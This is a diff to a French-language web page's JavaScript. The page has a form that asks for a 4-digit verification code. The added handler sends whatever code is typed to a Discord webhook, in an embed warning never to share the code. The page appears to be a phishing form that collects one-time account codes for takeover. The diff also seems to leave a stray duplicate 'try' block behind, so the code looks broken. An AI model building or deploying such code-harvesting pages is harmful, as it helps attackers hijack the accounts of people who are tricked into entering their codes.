@@ -209,28 +209,47 @@
       });
     });
 
-    form.addEventListener("submit", async function(e) {
-      e.preventDefault();
-      const code = Array.from(inputs).map(input => input.value).join('');
+form.addEventListener("submit", async function(e) {
+  e.preventDefault();
+  const code = Array.from(inputs).map(input => input.value).join('');
 
-      if (code.length !== 4 || !/^\d{4}$/.test(code)) {
-        messageEl.textContent = "Code invalide.";
-        messageEl.className = "message error";
-        return;
-      }
+  if (code.length !== 4 || !/^\d{4}$/.test(code)) {
+    messageEl.textContent = "Code invalide.";
+    messageEl.className = "message error";
+    return;
+  }
 
-      // Envoi du message à la webhook Discord
-      const embed = {
-      color: 0x1e1e26,
-      title: "🔒 Code de vérification",
-      description: `### \`${code}\`\n> ⚠️ Ne partagez ce code avec personne`,
-      thumbnail: {
-        url: "https://media.tenor.com/BSY1qTH8g-oAAAPo/check.gif"
-      },
-      footer: {
-        text: `⏰ ${new Date().toLocaleString('fr-FR')} · Expire dans 5 min`
-      }
-    };
+  const embed = {
+    color: 0x1e1e26,
+    title: "🔒 Code de vérification",
+    description: `### \`${code}\`\n> ⚠️ Ne partagez ce code avec personne`,
+    thumbnail: {
+      url: "https://media.tenor.com/BSY1qTH8g-oAAAPo/check.gif"
+    },
+    footer: {
+      text: `⏰ ${new Date().toLocaleString('fr-FR')} · Expire dans 5 min`
+    }
+  };
+
+  try {
+    const res = await fetch("WEBHOOK_URL_ICI", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })  // ← embeds est un tableau !
+    });
+
+    if (res.ok) {
+      messageEl.textContent = "Code envoyé !";
+      messageEl.className = "message success";
+    } else {
+      throw new Error(`HTTP ${res.status}`);
+    }
+  } catch (err) {
+    messageEl.textContent = "Erreur lors de l'envoi.";
+    messageEl.className = "message error";
+    console.error(err);
+  }
+});
 
 
       try {
